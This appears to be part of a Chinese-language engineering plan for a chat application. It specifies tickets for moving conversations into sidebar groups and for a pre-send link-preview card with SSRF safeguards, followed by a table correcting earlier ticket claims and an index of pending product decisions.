   - 真缺的（三动作 + 拒因）：`chatHistory` 命名空间里 **没有** 任何 `batchMove/moveToGroup/pinGroup/createGroupAndMove` 键（上面现读清单可证）；
     `packages/api-client/src/endpoints/chat.ts:412` `BatchConversationAction = 'delete' | 'favorite' | 'unfavorite' | 'archive' | 'unarchive'`——**没有 move**，
     所以批量移动今天结构上发不出去；单条归组只有对话框路径 `:545-546 setOrgFolder/setOrgTags`，写的是 `apps/web/src/stores/conversation-org.ts`（**客户端 localStorage 元数据 v1**）。
   - 拒因缺口现读：`packages/i18n/messages/web/zh-CN.json:9041` `"pinFailed": "置顶操作失败"`（`sidebar-chat-history.tsx:333` `error(tc('toast.pinFailed'))` 无分支、无原因、无重试出口）。
   - 竞品原文行位：`qoder/chat-stream-inventory.md:3338-3354`（`sidebarGroup.*`：`moveSessionAction` `moveSelectedAction` `createAndMoveAction` `createAndMoveSelectedAction` `pinError` `archiveSessionsAction` `clearAction` `editAction` `none` `openActions`）。

3. **改动分解**：
   1. 【止血·动作】侧栏条目右键/更多菜单加「移动到分组」，批量条（`apps/web/src/components/sidebar/conversation-batch-bar.tsx`，153 行）加「移动所选到分组」，
      两者共用同一分组选择浮层（不得各写一份列表）；分组头加置顶开关。
   2. 【根治·上行】`packages/api-client/src/endpoints/chat.ts` 的 `BatchConversationAction` 加 `'move'`（并加 `folderId` 入参）——但**这一步取决于分组是否落库**：
      现 `conversation-org.ts` 是 localStorage v1，所以第一批只做客户端写并把"只在本机"如实写进 UI（见第 8 栏），服务端化另计；
   3. 【止血·拒因】把 `aiChat.toast.pinFailed` 从一条扩成分支：`pinFailedBusy`（上一个操作还没完成）/ `pinFailedGone`（分组或会话已不存在）/ `pinFailedNetwork`（网络不可达，可重试），
      并在同一浮层里给「重试」；move 同理三档。**必须按实测分支取文案**：拿不到原因时显示 `pinFailedUnknown`（"未能确认原因，可稍后重试"）而不是冒充某一具体原因。
   4. 【根治·即时更新】移动成功后本地列表与 `folderFilter` 立即重算，不得等刷新（现读 `:387-392` 的管道已有 memo 链，接入点在这）。
   5. 【取证前置】开工先跑 `git grep -n "use-conversation-selection.ts" HEAD -- apps/web/src/components/sidebar` 与 `Read apps/web/src/components/sidebar/use-conversation-selection.ts`（176 行），
      确认批量选中集合 API 形态后再动 batch-bar；本轮**未取证**：置顶"分组"这一维在数据上如何表达（`orgMap` 只有会话→文件夹，没有文件夹→pinned）。

4. **受影响文件**：
   - `apps/web/src/components/sidebar-chat-history.tsx`
   - `apps/web/src/components/sidebar/conversation-batch-bar.tsx`、`apps/web/src/components/sidebar/use-conversation-selection.ts`
   - `apps/web/src/stores/conversation-org.ts`（文件夹级 pinned 字段）
   - `packages/api-client/src/endpoints/chat.ts`（`BatchConversationAction` 扩集；服务端化前置另计）
   - `packages/i18n/messages/web/{zh-CN,zh-TW,en,ja,ko}.json`
   - [新] `apps/web/src/components/__tests__/d165-group-move-actions.test.tsx`

5. **跨端与 i18n**（追加到 `chatHistory` 与 `aiChat.toast` 两族）：
   - `chatHistory.moveToGroup`＝`移动到分组`；`chatHistory.moveSelectedToGroup`＝`移动所选任务到分组`；`chatHistory.createGroupAndMove`＝`新建分组并移动`；
   - `chatHistory.moveSuccess`＝`已把 {count} 个对话移动到「{name}」`；`chatHistory.movePartial`＝`已移动 {moved} 个，{failed} 个未移动（目标分组可能已删除）。`
   - `chatHistory.groupPin`＝`分组置顶`；`chatHistory.groupUnpin`＝`取消分组置顶`；`chatHistory.groupPinned`＝`分组「{name}」已置顶`；
   - `aiChat.toast.pinFailedBusy`＝`上一个置顶还没完成，请稍候再试。`；`aiChat.toast.pinFailedGone`＝`该会话或分组已不存在，置顶未生效。`；
     `aiChat.toast.pinFailedNetwork`＝`网络不可达，置顶未保存，可重试。`；`aiChat.toast.pinFailedUnknown`＝`置顶失败，未能确认原因。`
   - 跨端：分组置顶/移动在 `packages/app`+`apps/mobile-rn`、`apps/miniapp-taro` 各自的会话列表落点**本轮未取证**（先跑 `git grep -ln "folderFilter\|conversation-org" HEAD -- packages/app apps/mobile-rn apps/miniapp-taro`）。
     若端上没有分组概念，按票面要求写清降级形态：收进"更多"还是不提供，并在 PROJECT_PLAN 标"平台独占:<理由>"或不标（§9）。

6. **验收判据**：
   - `node --test apps/web/src/components/__tests__/d165-group-move-actions.test.tsx`：单选移动 / 批量移动 / 成功后列表位置即时变化 / 分组置顶开关各自断言；
   - **反向对照 A**：人为删除目标分组后再移动 ⇒ 必须取 `movePartial`/`pinFailedGone` 并带"可重试"，断言文案里出现分组名；把拒因分支删成恒用通用"操作失败"，该用例必须红；
   - **反向对照 B**：`BatchConversationAction` 未含 `'move'` 时批量入口必须**不渲染**（而不是渲染了发不出去）——用 `git grep -c "'move'" HEAD -- packages/api-client/src/endpoints/chat.ts` 与用例内 mock 双向判；
   - `grep -n '"pinFailed":' packages/i18n/messages/web/zh-CN.json` 现读仍 1 处 ⇒ 死 key 扫描不得放过（跑 `pnpm check:i18n:dead` 或 `node scripts/scan-dead-i18n-keys.mjs --target=web --exit 1`，旧 `toast.pinFailed` 若无人引用须同批删除，不留孤儿）。

7. **依赖与顺序**：不依赖 D163/D164/D166，可独立派。**服务端化（`move` 真正落库）不阻塞第一批**：第一批＝纯客户端 + 拒因文案 + 两动作入口。
   挡在后面的：分组持久化到服务端（另票）；`conversation-org` localStorage v1 的跨设备可见性属已知限制，须在 UI 里如实标"仅本机"。

8. **风险与回退**：`BatchConversationAction` 是对外契约扩集，pre-commit 有 schema/路由一致性门（guardian 第 8 项一类），扩集必须**同批**在服务端路由存在性上对账，否则产出"前端发得出去、后端 404"型新债——本轮**未取证**该路由现有实现，开工先跑 `git grep -n "conversations/batch" HEAD -- apps/api/src` 读现有 action 白名单。
   回退＝新菜单项与批量项移除（纯新增 UI），`pinFailed*` 四键退回一键。爆炸半径＝侧栏（用户主导航），批量删除已共存，改动不得复用 batch 的乐观更新路径把"移动"当"删除"处理。
   **需 §24 拍板**：是（新增用户可见动作 + 改变"分组只在本机"这一可见承诺）。预填方案＝第一批明确标"分组信息仅保存在本机"，动作集合＝{移动到分组, 新建分组并移动, 移动所选到分组, 分组置顶}，拒因文案＝上面 4 条 toast 分支，服务端化作为第二条票。

---

### D166 粘贴链接没有预览卡,发出去之后才知道读不到(承 V4 §9.4③;一手取证 2026-09-28)

1. **目标行为**：粘一条 URL，发送前就看到"这条读得到吗、标题是什么"；读不到时说的是"暂时判不出来"还是"确实打不开"，而不是一片空白发出去再让 AI 回头解释失败。

2. **现状锚点（含同义否证 + 票面勘误）**：我按这些同义词搜过 `linkPreview / 链接预览 / unfurl / urlPreview / og:image / bookmark / previewUrl / fetchMetadata / urlMeta`。
   - **票面键名错**：`linkFileActions.previewLoading` 在取证清单里**零命中**（`grep -rn "linkFileActions\." docs/benchmark-evidence/2026-09/` → 无）；真实三处是
     `qoder/chat-stream-inventory.md:309-310` `chatSession.links.previewLoading:"正在加载链接预览…"` / `previewUnavailable:"无法读取链接预览"`，
     另有 `:4288` `composer.site.previewLoading`，以及——**这一族才是"失败给原因"的现成范本**——`:153-162` `chatActivity.outputFiles.previewUnavailable.{empty,invalid,missing,tooLarge,unsupported}` 五个子类；
   - 我方现状：`ReferenceType` 里有 `'url'`（`use-message-references.ts:13`），但**没有任何生产点把粘帖的 URL 变成引用**（`git grep -n "addUrlReference" HEAD -- apps/web/src` → 0；`message-input.tsx:294` 只有 `addFileReference/addTextReference/addCodeReference`），所以 URL 现在只是正文文本；
   - `@` 的 web 维度在 `packages/shared/src/chat/mention-engine.ts` 的 `MENTION_DIMENSIONS`（`:67` 起，注释自述"五类，与 GET /api/context/mentions 的 type 枚举一一对应"）——它是**选来源**，没有"可达性预检"这一维；
   - 后端侧：本轮**未取证**（`git grep -lE "og:|metadata|preview" HEAD -- apps/api/src/routes` 命中一片 admin 噪声，未见 unfurl/link-preview 端点，须逐条读 `apps/api/src/routes/` 才能定"确实没有"）；
   - 为什么仍算缺：以上任一条都不产出"发送前的可读性判断 + 标题"。**判"整族缺失"应撤的只有 D163 那类（准备态）；本票不撤，但票面键名/族名需按上面更正**。

3. **改动分解**：
   1. 【止血·识别】`apps/web/src/components/chat/message-input.tsx` 粘贴/输入完成时按 URL 形态识别，命中则挂一条**轻量链接卡**（复用 `ReferenceItem{type:'url'}`，补 `addUrlReference`，不新造第四种引用模型）。
   2. 【根治·探测】唯一出口新建 `apps/web/src/lib/link-preview.ts` → 走 api-client 新增 `GET /api/context/link-preview?url=` [需后端确认，见第 7 栏]：**只 HEAD/取 `<title>`，禁二次真实抓取**；超时上限取现读常量（本轮未取证 ⇒ 开工先 `git grep -n "AbortSignal.timeout\|timeout:" HEAD -- apps/web/src/lib` 复用既有档位，不得凭空 3000ms）。
   3. 【止血·三态】卡的三态必须分离：`loading` / `resolved`（标题+站点名）/ `unreachable`（区分 `blocked-by-policy`、`needs-login`、`not-found`、**`undetermined`**）；
      **`undetermined` 是硬要求**：内网/需登录/超时一律显示"未能确认（内网或需登录站点），发送后由 AI 尝试读取"，不得冒充"读不到"——与守门速查"把没判写成判过了"同一条禁令的 UI 版。
   4. 【止血·不阻断】探测失败**不阻止发送**：卡只做提示，发送按钮状态不受影响（第 6 栏显式断言）。
   5. 【根治·上行】探测结果（标题/站点/可达性判定态）作为结构化字段随消息上行，让 Agent 侧免去重复抓取；与 D164 第 4 步共用 `refs` 通道，不得拍平进正文。

4. **受影响文件**：
   - `apps/web/src/components/chat/message-input.tsx`
   - [新] `apps/web/src/lib/link-preview.ts`、[新] `apps/web/src/components/chat/link-preview-card.tsx`
   - `apps/web/src/hooks/use-message-references.ts`（补 `addUrlReference`）
   - `packages/api-client/src/endpoints/`（新增探测端点调用；**不得**端内裸 `fetch`，§3 api-client 规则）
   - `apps/api/src/routes/`（探测端点归属由第 7 栏定；若复用既有 `/api/context/*` 则改那一条）
   - `packages/i18n/messages/web/{zh-CN,zh-TW,en,ja,ko}.json`、`apps/miniapp-taro` 同名语言包（若端上做）
   - [新] `apps/web/src/components/chat/__tests__/d166-link-preview-card.test.tsx`

5. **跨端与 i18n**（新命名空间 `chatLinkPreview`）：
   - `chatLinkPreview.loading`＝`正在加载链接预览…`；`chatLinkPreview.untitled`＝`读到了内容，但没有标题。`；`chatLinkPreview.ariaLabel`＝`链接预览状态`
   - `chatLinkPreview.notFound`＝`这个地址返回了"未找到"，AI 可能读不到内容。`
   - `chatLinkPreview.needsLogin`＝`这个站点可能需要登录后才能读取（未能确认，发送后仍会尝试）。`
   - `chatLinkPreview.undetermined`＝`暂时无法判断这个链接是否可读（内网或受限站点），发送后仍会尝试读取。`
   - `chatLinkPreview.blocked`＝`该地址按安全策略不允许探测（不会发送任何请求）。`
   - 跨端：`apps/miniapp-taro` 输入框粘贴 URL 的场景存在性本轮**未取证**（先跑 `git grep -n "onPaste\|paste" HEAD -- apps/miniapp-taro/src` 与 `packages/app/src/features`）；
     RN/共享层同理。探测端点是服务端能力 ⇒ 三端共用同一个 api-client 出口，禁止各端自拼探测。

6. **验收判据**：
   - `node --test apps/web/src/components/chat/__tests__/d166-link-preview-card.test.tsx` 断言四条：正常 URL 出标题；404 出 `notFound`；需鉴权/内网出 `undetermined` **而非** `notFound`；**探测失败时发送按钮仍可用且真的发出**（反向对照：把卡改成 `disabled` 发送态，第 4 条必须红——这条是票面"这条要显式断言"的落地）；
   - 不产生第二次真实抓取：断言探测调用次数恰为 1 且方法为 HEAD/仅取 head 段（mock fetch 计数；把探测改成 GET 正文 ⇒ 用例红）；
   - 超时：假定时器推进到上限后卡必须落到 `undetermined`，不得永远 `loading`；
   - i18n：`node scripts/check-i18n-keys.mjs` parity 绿；`node scripts/check-i18n-locale-content-language.mjs --strict` 对新增 ja/ko 块不报"未判定"（§19 那条码位判据）。

7. **依赖与顺序**：可独立派，但**第 2 步的服务端归属先取证**：跑 `node scripts/check-outbound-routes.mjs`（守门 127 的问责档，`pnpm check:outbound-routes`）确认新增路由两侧登记，避免"前端写了 URL、后端不存在"那型（AGENTS §5 鉴权面公开化那条同族事故）。
   鉴权边界必须一并定：探测端点若公开＝可被当 SSRF 中继，须走 `packages/shared/src/utils/ssrf-guard.ts`（现读该文件在 `packages/shared/src/utils/`，由守门 126 登记为闭包不可达）——**这一格属安全面，开工前必须读现有实现，不得自造**。
   与 D164 共用 `refs` 上行字段 ⇒ 若 D164 先落地，本票第 5 步复用其字段；否则本票定义 `type:'url'` 引用载荷，D164 复用。

8. **风险与回退**：主要风险是"探测变成抓取"（成本与副作用翻倍）与"把没判写成读不到"。回退＝去掉 `addUrlReference` 调用与卡片渲染，URL 退回纯文本（数据结构未动、历史消息不受影响）；探测端点可先做成**默认关**的用户开关，但注意 §守门纪律：开关只关"要不要发探测"，不得关"探测失败说不说"。
   爆炸半径含后端新端点（鉴权面），必须同批改 nginx/限流两处（AGENTS §5 那条：边缘 nginx 与蓝绿 nginx 是两份配置）。
   **需 §24 拍板**：是（新增对外能力 + 引入一次出站网络请求）。预填方案＝① 触发时机＝粘贴完成且形如 `https?://` 的单条 URL；② 探测方式＝仅 HEAD，HEAD 不支持时**不降级为 GET 正文**（只标 `undetermined`）；③ 超时取仓内既有档位常量（先取证再填数字）；④ 失败一律不阻断发送；⑤ 内网/localhost/RFC1918 直接 `blocked` 不发请求；⑥ 卡片只在输入区显示、发送后不长期驻留消息气泡。

## 十一、票面勘误与待拍板决策索引（复验结果，2026-09-28）

### 11.1 勘误表：台账与本文前面的说法，以下这些**不对**，照它们派单会做错事

「主代理复核」列打 ✅ 的是我自己跑过命令确认的；打「族代理」的是该族代理给的命令与输出，主代理未复跑（如实分级，不冒充都验过）。

| 票 | 票面/文档原说法 | 现读结论 | 复验命令 | 复核 |
| --- | --- | --- | --- | --- |
| D132 | 「usage 帧在 TS 判别联合里没有成员」（缺一名） | 缺**两名**：`usage` 与 `tool-delta`；且 `contract.test.ts` 那句"新增事件漏写 payload 类型时编译报错"是恒绿假断言 | `git show HEAD:packages/shared/src/sse/contract.ts` 主面 30 名 vs 联合 28 名取差 | ✅（已按此修完并提交） |
| D137 | 共享 AI 聊天屏「导出在位、零消费方」 | **不成立**：RN 正在渲染它 | `grep -n "ChatScreen as SharedChatScreen" apps/mobile-rn/src/screens/ChatScreen.tsx` → `:120` 导入、`:2190` 渲染 | ✅ |
| D143 | 「`_high_risk_tools_from_env` 返回 `frozenset()` ⇒ 默认高危清单是空的」 | 默认档非空：内置 `_DEFAULT_HIGH_RISK_TOOLS` 16 名 + `computer_` 前缀，env 只追加。**真缺陷在别处**：16 名里有若干名在注册表根本不存在，而 `api_endpoint_call`、`edu_create_refund`/`edu_approve_refund`（资金不可逆）不在表内 | `sed -n '236,240p' apps/ai-service/app/services/agent_loop_v2.py`；抽 4 名查注册面 `git grep -c "\"file_batch_edit\"" HEAD -- …/mcp_server.py` → 0（`edit_file` 为 1） | ✅（抽样 4 名，未穷尽 16 名） |
| D145 | 子代理词汇「零映射」 | 服务端**可执行**注册表 10 个，前 5 与 CLI 逐字相同 ⇒ 零映射不成立。更硬的真缺陷：`mcp_server.py:8396` 的 `dispatch_subagent` **描述**向模型广告 5 个注册表里不存在的名，模型照说明书调用必回「Agent 不存在」 | `git show HEAD:apps/ai-service/app/services/agent_orchestrator.py`（`:119`）与 `mcp_server.py:8396` 对照 | 族代理 |
| D147 | 「仓内未命中 OTel/Jaeger、无分布式追踪」 | OTel SDK + OTLP exporter + `docker-compose.observability.yml`（otel-collector/jaeger）都在，api→ai-service 的 traceparent 已贯通。缺的是另四段：客户端不发头 / trace 未进主循环 / SSE 帧不回带 / 工具事件不带 id。路径也写错：`app/core/trace_context.py` 实为 `app/middleware/trace_context.py` | `grep -n "opentelemetry" apps/api/package.json`、`grep -n otel deploy/observability/docker-compose.observability.yml` | 族代理 |
| D151 | 「没有把键入送回去的通道」 | 上行通道**已存在**：`/ws/terminal/:sessionId` 真收 `{type:'input'}→writeInput`（`terminal-ws.ts:112-122`），缺的是它与对话流执行器之间的桥 + 一个下行帧 ⇒ 本票从"新建协议"缩为"桥接" | `grep -n "writeInput" apps/ai-service/app/routers/terminal_ws.py`（族代理给的路径） | 族代理 |
| D152 | 「对话流看不到目标」 | GoalCard 已挂载（`ai-side-panel-tools.tsx:525`）、四态在 `stores/goal.ts`。真缺口是 goal **无服务侧主副本** ⇒ 必须先服务化再加事件，否则触发"登记而无生产"的 parity 阻断 | `grep -n "GoalCard" apps/web/src/components/ide/ai-side-panel-tools.tsx` | 族代理 |
| D153 | 「档位与采样参数会分叉」 | 服务端没有 per-conversation 的档位主人（schema 只有 title/model/archivedAt），"分叉"那半不成立；载体改用 `ws-broadcast.broadcastToUser`，而该装饰器 HEAD 面**零生产者** | `grep -n "broadcastToUser" -r apps/ai-service/app` | 族代理 |
| D154 | 「MCP 启动状态与 OAuth 完成没有下行」 | OAuth 半票前提不足：`MCPOAuthClient` 是自动取 token，仓内没有产品内交互授权流 ⇒ oauth 下行挂后票，别造一条永远不响的通道 | 族代理给的文件读面命令 | 族代理 |
| D158 | 「审批只有三档、无规则生成能力」 | 前缀规则的**存储/匹配/撤销/枚举/过期五件套已在** `approval_persistence.py`（`:48/:133/:171/:211/:256/:272/:298`），并被 `mcp_server.py:2046/2117/2155/2160` 使用 ⇒ 射程缩为"接线 + 第四档 UI + 规则面板"。**禁止新建第二份规则存储。** | `git grep -nE "def (normalize_exec_key\|grant\|revoke\|list_keys\|purge_expired)" HEAD -- apps/ai-service/app/services/approval_persistence.py` | ✅（五条 def 全部命中） |
| D159 | 「审批界面不显示执行环境——文案零命中」 | 沙箱文案存在（`ai.terminal.isolation` 等 4 处，zh-CN.json:7896）。真缺口是"静态声明没升级成**逐请求事实**、且不住在审批弹窗里" | `grep -n "isolation" packages/i18n/messages/web/zh-CN.json` | 族代理 |
| D162 | 「zh-CN 同族 12 条在一个 `chatQueue` 命名空间下」 | 没有单一 `chatQueue` ns 可复现：实读跨 `chat.*` / `ai.*.queue.*` / 各端 `steer*` 三处 ⇒ 键表按三处分别登记 | `grep -n "queue" packages/i18n/messages/web/zh-CN.json` | 族代理 |
| D163 | 「Diff 预览缺准备态」 | **这一子项应撤**：`ai.checkpointHistory.rollbackConfirmLoading` 即竞品 `undoPreparingDescription` 的等价物（zh-CN.json:7253）。另"三态"须限定：notice union 确是三档（`use-preview-staleness.ts:28`），但同族文案表自述四级，且 `refresh` 出口已在（`:244`） | `grep -n "rollbackConfirmLoading" packages/i18n/messages/web/zh-CN.json` | 族代理 |
| D164 | 「选中内容没有任何暂存面」 | 范围要缩：`addTextReference`/`removeReference` 已在（`message-input.tsx:294`），`refs` 已是结构化上行（`use-message-send.ts:411/480`）⇒ 票面"不得拍平进正文"已满足，真缺的是**跨轮次容器** | 族代理给的行号复验 | 族代理 |
| D165 | 路径 `apps/web/src/components/ai/sidebar-chat-history.tsx` | **该路径不存在**，真身是 `apps/web/src/components/sidebar-chat-history.tsx`（1,179 行；181/414 两个行号本身对得上）。且会话级置顶（`:326-333`）、批量五动作（`:398-428`）、folder/tag（`:545-546`）全在 ⇒ 缩到 3 个动作 + 拒因 | `ls apps/web/src/components/sidebar-chat-history.tsx` | 族代理 |
| D166 | 竞品键 `linkFileActions.previewLoading` | 在取证清单里**零命中**；真名是 `chatSession.links.preview*`（inventory:309-310）。而"失败给原因"的现成范本是 `chatActivity.outputFiles.previewUnavailable.{empty,invalid,missing,tooLarge,unsupported}`（:153-162）⇒ 本文 §9.4③ 与票面引的键名都要按此改 | `grep -n "preview" docs/benchmark-evidence/2026-09/qoder/chat-stream-inventory.md` | 族代理 |
| D167 | 本文原 §9.1 的族级聚合 | 修复前所有"某族 N 处"不可用（`tagPill` 虚到 87 行）；另新增第四缺陷并一并修掉：语言包语料按磁盘读而源码语料按 HEAD 读 | `node docs/benchmark-evidence/2026-09/reconcile.mjs --self-test` | ✅（修前 0/3、修后 3/3） |
| D168 | 「24 行 `G-G-` 型畸形号，分布 {G:24}」 | 现读 **27 行，分布 {G:26, D:1}**；按"整行含 `G-G-`"粗数会得 91，差异全来自"编号必须落在复选框后正文开头"这条判据 | 导入 `live-doc-edit.mjs` 的 `findMalformedIds` 喂 `git show HEAD:PROJECT_PLAN.md` | 族代理 |
| D169 | 阻塞点归因「第三层判据③工作区==索引」 | 真因是 `heal-worktree-tracked.mjs` **第四层** `restoreBypassOrphans` 的判据③"磁盘上存在就不碰"（`:592-613`）。并补定级前置存量：四份活文档 HEAD 面点名的仓库内路径 1,365 条唯一提及中 **99 条不在 HEAD 树** ⇒ 裸判"点名即须在位"就是一台恒红门 | 族代理给的脚本现读 | 族代理 |
| 文档级 | 全仓引用「§12e 同型」指恒红门 | AGENTS 里那条实际标题是 **§12f**；§12e 讲的是 `pnpm install --filter` 削依赖树。本表不改 AGENTS（那是活文档，归其持有人），但**派单时按 §12f 找依据** | `grep -n "^### 12e\|^### 12f" AGENTS.md` | 族代理 |
| 契约注释 | `contract.ts` 称"契约 ⊆ 生产由对账 0b 与对账 0 双向看护" | 门里 0b 实为**生产 ⊆ 契约**（`check-agent-event-parity.mjs:679`），"登记而无生产"只有接了前端监听才红 ⇒ 直接影响 S10 每条协议票的落地顺序（生产点、契约、消费、门四件套必须同批） | `sed -n '670,690p' scripts/check-agent-event-parity.mjs` | 族代理 |
| D140 | 「`task_executors.py` 现读 16 个 `async def`」 | 16 含两处嵌套 helper；权威口径是注册表 **8 类 = 6 真实 + 2 自证 stub**（`:88`），`dag_scheduler.py:563` 已真实分派 | 族代理给的现读命令 | 族代理 |

**还有一条纪律级更正**：本文 §9.2 用"标识符零命中"判缺的口径不适用于任何"我方另起一名"的场景；本表 20 行里有一半是被这种"名字不在就等于没有"造出来的假差距。往后所有对标票的第 2 栏必须先给同义词搜索清单，再谈缺不缺。

### 11.2 待拍板决策索引（全部已给可直接批准的预填方案，批准即开工）

AGENTS §24 要求新增对外能力/改变用户可见行为须显式同意。下面 14 条不是开放问题，**每条的方案都写在对应票的第 8 栏**，这里只给索引与默认建议：

| 票 | 要拍的是什么 | 建议默认 |
| --- | --- | --- |
| D130 | 新增"推理强度"第三轴控件并把档位送进入参链 | 先只加前端通道 + 后端接住，档位表复用门 147 已有的 C5/C6，不新建第四份 |
| D131 | 连接状态件是否常驻上屏 | 仅异常态显示，常态不占对话流高度 |
| D142 | 工具契约的权限轴落地范围 | 只落权限轴（resultBudget 已有消费方），不改缺省语义 |
| D143 | 高危工具集：清掉注册表里不存在的 6 名 + 补入资金不可逆的 3 名 | 按票内逐名附的副作用证据取；**不要**翻成默认拒绝 |
| D144 | V1 出口壳的下线方式 | 只改 `routers/agents.py:995` 一处归一，不动其余 |
| D145 | 子代理展示名 / 执行名 / wire 值三分离 | 按票内三分离方案；先修 `dispatch_subagent` 广告的不存在名 |
| D146 | MCP 凭据落盘降级档位 | 零新依赖三档降级（票内已列） |
| D147 | trace 采样率与编号可见性 | 沿用现有 collector，只补四段接线 |
| D149 | 11 件孤儿件逐件处置（删 / 接线 / 保留） | 票内逐件预填；孤儿删除须先按 §7 三问答复 |
| D151 | 交互式命令允许"代答"（用户输入送进正在跑的命令） | 默认开 + 300s 超时；两端不能输入时给固定降级文案 |
| D152 | goal 六态与单帧 cleared | 取是 |
| D153 | WS 常开、档位不做 per-conversation 主人 | 载体用 WS 常开；档位那半**不做**（无主副本，做了就是分叉源） |
| D158 | 第四档「批准并生成放行规则」的参数 | `kind=exec_prefix`、tokens=2、仅 `run_command` + 当前工作区、TTL 90 天、规则面板单条可撤销、风险命令强制二次确认 |
| D159 | 网络放行档位 | `kind=network` + `normalize_net_key(host,port,protocol)` + 三档 scope + 撤销入口；**路径授权不做** |

未列入的 D161/D162/D163/D164/D165/D166 由族代理判为"需 §24 或直接可派"，其结论在各自第 8 栏；D150 不是决策项而是环境项（服务与数据库起齐才能做）。

